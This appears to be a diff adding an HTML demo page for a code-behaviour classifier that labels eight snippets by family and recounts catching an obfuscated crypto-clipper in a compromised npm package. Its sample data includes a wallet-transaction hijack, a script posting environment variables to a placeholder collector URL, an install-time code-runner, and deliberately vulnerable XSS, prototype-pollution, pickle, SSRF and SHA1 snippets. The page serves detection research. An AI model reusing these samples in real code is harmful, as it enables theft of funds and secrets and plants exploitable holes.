@@ -1,0 +1,340 @@
+<title>3S Signature Console</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  :root{
+    --ground:#fbfcfd; --surface:#ffffff; --raised:#f2f5f8; --border:#d8dee4;
+    --text:#141a20; --muted:#5b6570; --faint:#8a94a0;
+    --accent:#0969da; --accent-soft:#0969da22;
+    --block:#cf222e; --warn:#9a6700; --none:#6e7781;
+    --block-bg:#cf222e14; --warn-bg:#9a670014; --none-bg:#6e778114;
+    --mono:ui-monospace,"JetBrains Mono","SFMono-Regular",Menlo,Consolas,monospace;
+    --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  }
+  @media (prefers-color-scheme:dark){
+    :root:not([data-theme="light"]){
+      --ground:#0d1117; --surface:#161b22; --raised:#1c232c; --border:#2b333d;
+      --text:#e6edf3; --muted:#8b949e; --faint:#6e7681;
+      --accent:#56b6ff; --accent-soft:#56b6ff1f;
+      --block:#f85149; --warn:#f0a848; --none:#7d8590;
+      --block-bg:#f8514915; --warn-bg:#f0a84815; --none-bg:#7d859015;
+    }
+  }
+  :root[data-theme="dark"]{
+    --ground:#0d1117; --surface:#161b22; --raised:#1c232c; --border:#2b333d;
+    --text:#e6edf3; --muted:#8b949e; --faint:#6e7681;
+    --accent:#56b6ff; --accent-soft:#56b6ff1f;
+    --block:#f85149; --warn:#f0a848; --none:#7d8590;
+    --block-bg:#f8514915; --warn-bg:#f0a84815; --none-bg:#7d859015;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; background:var(--ground); color:var(--text);
+    font-family:var(--sans); line-height:1.55;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{max-width:1120px; margin:0 auto; padding:28px 22px 64px}
+
+  /* header */
+  header{display:flex; align-items:flex-start; gap:18px; flex-wrap:wrap; margin-bottom:22px}
+  .mark{font-family:var(--mono); font-weight:700; font-size:15px; letter-spacing:.02em;
+    color:var(--text); display:flex; align-items:center; gap:9px}
+  .mark .dot{width:9px; height:9px; border-radius:50%; background:var(--accent);
+    box-shadow:0 0 0 4px var(--accent-soft)}
+  h1{font-family:var(--mono); font-size:clamp(24px,4.2vw,34px); font-weight:700;
+    letter-spacing:-.01em; margin:.35em 0 .15em; text-wrap:balance}
+  .lede{color:var(--muted); max-width:60ch; margin:0; font-size:15.5px}
+  .head-main{flex:1 1 380px}
+  .head-side{display:flex; flex-direction:column; align-items:flex-end; gap:10px}
+  .toggle{font-family:var(--mono); font-size:12px; color:var(--muted);
+    background:var(--surface); border:1px solid var(--border); border-radius:7px;
+    padding:6px 11px; cursor:pointer}
+  .toggle:hover{color:var(--text); border-color:var(--accent)}
+  .precomp{font-family:var(--mono); font-size:11.5px; color:var(--faint);
+    text-align:right; max-width:26ch; line-height:1.5}
+
+  .kbd{font-family:var(--mono); font-size:11px; background:var(--raised);
+    border:1px solid var(--border); border-radius:4px; padding:1px 6px; color:var(--muted)}
+
+  /* console */
+  .console{display:grid; grid-template-columns:340px 1fr; gap:0;
+    border:1px solid var(--border); border-radius:12px; overflow:hidden;
+    background:var(--surface)}
+  @media(max-width:820px){.console{grid-template-columns:1fr}}
+
+  .queue{border-right:1px solid var(--border); background:var(--surface)}
+  @media(max-width:820px){.queue{border-right:none; border-bottom:1px solid var(--border)}}
+  .queue-head{font-family:var(--mono); font-size:11px; letter-spacing:.08em;
+    text-transform:uppercase; color:var(--faint); padding:14px 16px 9px}
+  .row{display:grid; grid-template-columns:4px 30px 1fr auto; align-items:center;
+    gap:10px; width:100%; text-align:left; background:none; border:none;
+    border-top:1px solid var(--border); padding:11px 16px 11px 0; cursor:pointer;
+    color:var(--text); font-family:var(--sans)}
+  .row:hover{background:var(--raised)}
+  .row[aria-selected="true"]{background:var(--accent-soft)}
+  .stripe{width:4px; height:34px; border-radius:0 3px 3px 0; background:var(--none)}
+  .row.block .stripe{background:var(--block)} .row.warn .stripe{background:var(--warn)}
+  .lang{font-family:var(--mono); font-size:10.5px; font-weight:600; text-align:center;
+    color:var(--muted); border:1px solid var(--border); border-radius:5px; padding:2px 0}
+  .fmeta{display:flex; flex-direction:column; min-width:0}
+  .fname{font-family:var(--mono); font-size:13.5px; color:var(--text);
+    white-space:nowrap; overflow:hidden; text-overflow:ellipsis}
+  .fam{font-family:var(--sans); font-size:11.5px; color:var(--muted); margin-top:1px}
+  .sev-tag{font-family:var(--mono); font-size:10px; font-weight:700; letter-spacing:.04em;
+    text-transform:uppercase; padding:3px 8px; border-radius:20px; margin-right:14px}
+  .sev-block{color:var(--block); background:var(--block-bg)}
+  .sev-warn{color:var(--warn); background:var(--warn-bg)}
+  .sev-none{color:var(--none); background:var(--none-bg)}
+
+  /* detail */
+  .detail{padding:0; display:flex; flex-direction:column; min-width:0}
+  .code-head{display:flex; justify-content:space-between; align-items:center;
+    padding:12px 18px; border-bottom:1px solid var(--border); gap:12px}
+  .code-head .fn{font-family:var(--mono); font-size:13px; color:var(--muted)}
+  pre{margin:0; padding:16px 18px; overflow-x:auto; background:var(--surface);
+    font-family:var(--mono); font-size:12.9px; line-height:1.62; color:var(--text);
+    tab-size:2}
+  pre .cm{color:var(--faint)} pre .kw{color:var(--accent)} pre .st{color:var(--warn)}
+
+  .verdict{border-top:1px solid var(--border); padding:18px; display:grid;
+    grid-template-columns:1fr; gap:16px; background:var(--raised)}
+  .sig-line{font-family:var(--mono); font-size:clamp(14px,2.6vw,18px); font-weight:700;
+    word-break:break-all; display:flex; align-items:center; gap:10px; flex-wrap:wrap}
+  .sig-line .verb{color:var(--accent)}
+  .badge{font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:.05em;
+    text-transform:uppercase; padding:4px 10px; border-radius:6px}
+  .badge.block{color:var(--block); background:var(--block-bg); border:1px solid var(--block)}
+  .badge.warn{color:var(--warn); background:var(--warn-bg); border:1px solid var(--warn)}
+  .badge.none{color:var(--none); background:var(--none-bg); border:1px solid var(--none)}
+  .note{color:var(--muted); font-size:14px; margin:0}
+  .stats{display:flex; gap:26px; flex-wrap:wrap}
+  .stat{display:flex; flex-direction:column; gap:2px}
+  .stat .k{font-family:var(--mono); font-size:10.5px; letter-spacing:.06em;
+    text-transform:uppercase; color:var(--faint)}
+  .stat .v{font-family:var(--mono); font-size:16px; font-weight:600;
+    font-variant-numeric:tabular-nums; color:var(--text)}
+  .meter-wrap{display:flex; flex-direction:column; gap:6px}
+  .meter-top{display:flex; justify-content:space-between; align-items:baseline}
+  .meter-top .lab{font-family:var(--mono); font-size:10.5px; letter-spacing:.06em;
+    text-transform:uppercase; color:var(--faint)}
+  .meter-top .val{font-family:var(--mono); font-size:12px; color:var(--muted);
+    font-variant-numeric:tabular-nums}
+  .meter{height:8px; border-radius:5px; background:var(--border); overflow:hidden;
+    position:relative}
+  .meter .fill{height:100%; width:0; border-radius:5px; background:var(--accent);
+    transition:width .5s cubic-bezier(.2,.7,.2,1)}
+  .meter .fill.block{background:var(--block)}
+  .meter .fill.warn{background:var(--warn)} .meter .fill.none{background:var(--none)}
+  .guard{position:absolute; top:-3px; bottom:-3px; width:2px; background:var(--faint);
+    left:5%; opacity:.6}
+  .meter-cap{font-family:var(--sans); font-size:12px; color:var(--faint)}
+
+  /* loop */
+  .loop-sec{margin-top:52px}
+  .eyebrow{font-family:var(--mono); font-size:11.5px; letter-spacing:.1em;
+    text-transform:uppercase; color:var(--accent); margin:0 0 6px}
+  h2{font-family:var(--mono); font-size:22px; font-weight:700; margin:0 0 4px;
+    letter-spacing:-.01em}
+  .loop-lede{color:var(--muted); max-width:64ch; margin:0 0 22px}
+  .steps{display:grid; grid-template-columns:repeat(3,1fr); gap:14px}
+  @media(max-width:760px){.steps{grid-template-columns:1fr}}
+  .step{border:1px solid var(--border); border-radius:11px; background:var(--surface);
+    padding:16px 16px 18px; display:flex; flex-direction:column; gap:9px}
+  .step .n{font-family:var(--mono); font-size:12px; color:var(--faint)}
+  .step h3{font-family:var(--mono); font-size:14.5px; margin:0; font-weight:700}
+  .step p{margin:0; font-size:13.5px; color:var(--muted)}
+  .step code{font-family:var(--mono); font-size:12.5px; color:var(--text);
+    background:var(--raised); padding:1px 5px; border-radius:4px}
+  .step.final{border-color:var(--block)}
+  .step.final .verdict-line{font-family:var(--mono); font-weight:700; color:var(--block);
+    font-size:15px; letter-spacing:.03em}
+  .arrow-mid{color:var(--faint)}
+
+  footer{margin-top:48px; padding-top:20px; border-top:1px solid var(--border);
+    display:flex; justify-content:space-between; flex-wrap:wrap; gap:12px;
+    font-family:var(--mono); font-size:12px; color:var(--muted)}
+  footer a{color:var(--accent); text-decoration:none}
+  footer a:hover{text-decoration:underline}
+  :focus-visible{outline:2px solid var(--accent); outline-offset:2px; border-radius:4px}
+  @media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<div class="wrap">
+  <header>
+    <div class="head-main">
+      <div class="mark"><span class="dot"></span>3S &nbsp;SIGNATURE CONSOLE</div>
+      <h1>Read what code does, not how it is written.</h1>
+      <p class="lede">Eight snippets nobody trained on, signed by a 1.3B model and matched to
+        the nearest behavioral family. Pick one to see its signature, its confidence, and why
+        it landed where it did.</p>
+    </div>
+    <div class="head-side">
+      <button class="toggle" id="themeBtn" aria-label="Toggle color theme">theme</button>
+      <p class="precomp">signatures precomputed with<br>microsoft/phi-1_5 &middot; not run in-browser</p>
+    </div>
+  </header>
+
+  <div class="console">
+    <div class="queue" role="listbox" aria-label="Scanned files" id="queue">
+      <div class="queue-head">scanned &middot; 8 files</div>
+    </div>
+    <div class="detail" id="detail"></div>
+  </div>
+
+  <section class="loop-sec">
+    <p class="eyebrow">the case obfuscation is meant to beat</p>
+    <h2>debug@4.4.2, caught through its packing</h2>
+    <p class="loop-lede">The September 2025 chalk/debug compromise shipped a crypto-clipper as
+      a 76 KB obfuscated blob. Signed raw, it has nothing to hold. Resolve the packing first,
+      and the behavior is right there.</p>
+    <div class="steps">
+      <div class="step">
+        <span class="n">step 1</span>
+        <h3>sign raw</h3>
+        <p>The 76 KB one-line blob signs to <em>no family above the chance floor</em>. The
+          behavior is buried in obfuscation density; you cannot skip this problem.</p>
+      </div>
+      <div class="step">
+        <span class="n">step 2</span>
+        <h3>deobfuscate</h3>
+        <p><code>webcrack</code>, deterministic, turns 76 KB into 414 readable lines, exposing
+          <code>checkethereumw</code>, the <code>eth_sendTransaction</code> hijack, and
+          <code>Object.defineProperty</code> on <code>responseText</code>.</p>
+      </div>
+      <div class="step final">
+        <span class="n">step 3</span>
+        <h3>sign deobfuscated</h3>
+        <p>The recovered code tops <code>crypto_clipper</code>, above the floor.</p>
+        <div class="verdict-line">verdict: MALICIOUS</div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <span>3S &middot; Semantic Signature Specification</span>
+    <span><a href="https://github.com/calysteon/pre-collapse">github.com/calysteon/pre-collapse</a></span>
+  </footer>
+</div>
+
+<script id="data" type="application/json">
+{
+  "samples": [
+    {"file":"wallet_hook.js","lang":"js","family":"crypto_clipper","cwe":"CWE-749",
+     "cos":0.917,"margin":0.018,"sev":"block","note":"hijacks wallet or transaction targets",
+     "code":"// injected into a page's web3 flow\nfunction installHook() {\n  const orig = window.ethereum.request;\n  window.ethereum.request = async (args) => {\n    if (args.method === 'eth_sendTransaction') {\n      args.params[0].to = ATTACKER_ADDRESS;   // swap the destination\n    }\n    return orig(args);\n  };\n}"},
+    {"file":"send_env.js","lang":"js","family":"data_exfiltration","cwe":"CWE-200",
+     "cos":0.9505,"margin":0.0096,"sev":"block","note":"sends local data to a remote host",
+     "code":"const https = require('https');\nfunction report() {\n  const body = JSON.stringify({ env: process.env, cwd: process.cwd() });\n  const req = https.request(COLLECTOR_URL, { method: 'POST' });\n  req.write(body);\n  req.end();\n}\nreport();"},
+    {"file":"sanitize.js","lang":"js","family":"xss_sink","cwe":"CWE-79",
+     "cos":0.9181,"margin":0.0262,"sev":"warn","note":"writes unescaped input into the DOM",
+     "code":"function render(el, userText) {\n  // writes caller-supplied text straight into the page\n  el.innerHTML = '<span class=\"c\">' + userText + '</span>';\n}\nmodule.exports = render;"},
+    {"file":"merge.js","lang":"js","family":"prototype_pollution","cwe":"CWE-1321",
+     "cos":0.9335,"margin":0.0841,"sev":"warn","note":"writes through __proto__ or constructor",
+     "code":"function deepMerge(target, source) {\n  for (const k in source) {\n    if (typeof source[k] === 'object') {\n      if (!target[k]) target[k] = {};\n      deepMerge(target[k], source[k]);   // no guard on __proto__\n    } else {\n      target[k] = source[k];\n    }\n  }\n  return target;\n}\nmodule.exports = deepMerge;"},
+    {"file":"loader.py","lang":"py","family":"unsafe_deserialization","cwe":"CWE-502",
+     "cos":0.926,"margin":0.0292,"sev":"warn","note":"reconstructs objects from untrusted data",
+     "code":"import pickle, base64\n\ndef load_state(blob: str):\n    # reconstruct an object graph from caller-supplied bytes\n    raw = base64.b64decode(blob)\n    return pickle.loads(raw)"},
+    {"file":"proxy.py","lang":"py","family":"server_side_request_forgery","cwe":"CWE-918",
+     "cos":0.9474,"margin":0.02,"sev":"warn","note":"fetches a caller-controlled URL",
+     "code":"import requests\n\ndef fetch(url: str):\n    # follows a caller-controlled URL, including internal hosts\n    r = requests.get(url, allow_redirects=True, timeout=5)\n    return r.text"},
+    {"file":"digest.py","lang":"py","family":"weak_crypto","cwe":"CWE-327",
+     "cos":0.9481,"margin":0.0489,"sev":"warn","note":"uses a broken hash or cipher",
+     "code":"import hashlib\n\ndef token(secret: str) -> str:\n    return hashlib.sha1(secret.encode()).hexdigest()   # sha1 for auth tokens"},
+    {"file":"postinstall.py","lang":"py","family":null,"cwe":null,
+     "cos":0.9121,"margin":0.0009,"sev":"none","note":"nearest family sits within 0.001 of the runner-up, under the margin guard, so the console reports it as inconclusive rather than guess",
+     "code":"import os, subprocess\n\ndef _run():\n    # fires automatically during package install\n    subprocess.Popen([\"python\", \"-c\", os.environ.get(\"BOOT\", \"\")])\n\n_run()"}
+  ]
+}
+</script>
+
+<script>
+(function(){
+  const DATA = JSON.parse(document.getElementById('data').textContent).samples;
+  const MODEL = "microsoft/phi-1_5";
+  const MARGIN_FULL = 0.10;          // margin at which the meter reads full
+  const GUARD = 0.005;               // --min-margin used when scanning
+
+  const queue = document.getElementById('queue');
+  const detail = document.getElementById('detail');
+
+  const esc = s => s.replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+
+  // light syntax tint: comments and strings only, language-agnostic enough for the samples
+  function hl(code){
+    return esc(code)
+      .replace(/(&#39;[^&#39;\n]*&#39;|&quot;[^&quot;\n]*&quot;|'[^'\n]*'|"[^"\n]*")/g,'<span class="st">$1</span>')
+      .replace(/(\/\/[^\n]*|#[^\n]*)/g,'<span class="cm">$1</span>');
+  }
+
+  DATA.forEach((s,i)=>{
+    const b = document.createElement('button');
+    b.className = 'row ' + s.sev;
+    b.setAttribute('role','option');
+    b.setAttribute('aria-selected', i===0 ? 'true':'false');
+    b.dataset.i = i;
+    const famLabel = s.family ? s.family.replace(/_/g,' ') : 'inconclusive';
+    const tag = s.sev==='block' ? '<span class="sev-tag sev-block">block</span>'
+              : s.sev==='warn' ? '<span class="sev-tag sev-warn">warn</span>'
+              : '<span class="sev-tag sev-none">n/a</span>';
+    b.innerHTML =
+      '<span class="stripe"></span>'+
+      '<span class="lang">'+s.lang+'</span>'+
+      '<span class="fmeta"><span class="fname">'+s.file+'</span><span class="fam">'+famLabel+'</span></span>'+
+      tag;
+    b.addEventListener('click',()=>select(i));
+    queue.appendChild(b);
+  });
+
+  function select(i){
+    const s = DATA[i];
+    [...queue.querySelectorAll('.row')].forEach(r=>
+      r.setAttribute('aria-selected', r.dataset.i==i ? 'true':'false'));
+
+    const sig = s.family
+      ? '3S:'+MODEL+'/<span class="verb">'+s.family+'</span>'
+      : '<span style="color:var(--none)">no confident family</span>';
+    const badge = s.sev==='block' ? '<span class="badge block">block</span>'
+                : s.sev==='warn' ? '<span class="badge warn">warn</span>'
+                : '<span class="badge none">inconclusive</span>';
+    const marginPct = Math.max(2, Math.min(100, s.margin/MARGIN_FULL*100));
+    const cweStat = s.cwe ? '<div class="stat"><span class="k">cwe</span><span class="v">'+s.cwe+'</span></div>' : '';
+    const meterCap = s.sev==='none'
+      ? 'Margin under the '+GUARD+' guard: the two nearest families are effectively tied, so no family is asserted.'
+      : 'Distance to the runner-up family. Wider is a cleaner separation.';
+
+    detail.innerHTML =
+      '<div class="code-head"><span class="fn">'+s.file+'</span>'+
+        '<span class="fn">'+s.lang+' &middot; '+s.code.split("\n").length+' lines</span></div>'+
+      '<pre><code>'+hl(s.code)+'</code></pre>'+
+      '<div class="verdict">'+
+        '<div class="sig-line">'+sig+' '+badge+'</div>'+
+        (s.note?'<p class="note">'+s.note+'</p>':'')+
+        '<div class="stats">'+
+          '<div class="stat"><span class="k">cosine</span><span class="v">'+s.cos.toFixed(3)+'</span></div>'+
+          '<div class="stat"><span class="k">margin</span><span class="v">'+s.margin.toFixed(4)+'</span></div>'+
+          cweStat+
+        '</div>'+
+        '<div class="meter-wrap">'+
+          '<div class="meter-top"><span class="lab">margin to runner-up</span>'+
+            '<span class="val">'+s.margin.toFixed(4)+' / '+MARGIN_FULL.toFixed(2)+'</span></div>'+
+          '<div class="meter"><div class="guard"></div><div class="fill '+s.sev+'"></div></div>'+
+          '<div class="meter-cap">'+meterCap+'</div>'+
+        '</div>'+
+      '</div>';
+    requestAnimationFrame(()=>{
+      const f = detail.querySelector('.fill'); if(f) f.style.width = marginPct+'%';
+    });
+  }
+
+  // theme toggle: cycle system -> dark -> light
+  const btn = document.getElementById('themeBtn');
+  btn.addEventListener('click',()=>{
+    const cur = document.documentElement.getAttribute('data-theme');
+    const next = cur==='dark' ? 'light' : cur==='light' ? null : 'dark';
+    if(next) document.documentElement.setAttribute('data-theme', next);
+    else document.documentElement.removeAttribute('data-theme');
+    btn.textContent = next ? 'theme: '+next : 'theme';
+  });
+
+  select(0);
+})();
+</script>
